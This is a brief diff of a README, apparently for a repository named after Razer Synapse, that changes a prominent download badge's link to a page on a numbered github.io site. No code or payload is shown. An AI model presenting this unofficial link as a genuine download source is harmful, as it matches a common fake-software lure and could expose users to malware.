@@ -4,7 +4,7 @@
 <img src="https://m.media-amazon.com/images/I/41+CedTvUmL.png" width="400">
 </p>
 
-[![GET — RAZER SYNAPSE](https://img.shields.io/badge/GET-RAZER%20SYNAPSE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — RAZER SYNAPSE](https://img.shields.io/badge/GET-RAZER%20SYNAPSE-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Razer-Synapse)
 
 ---
 
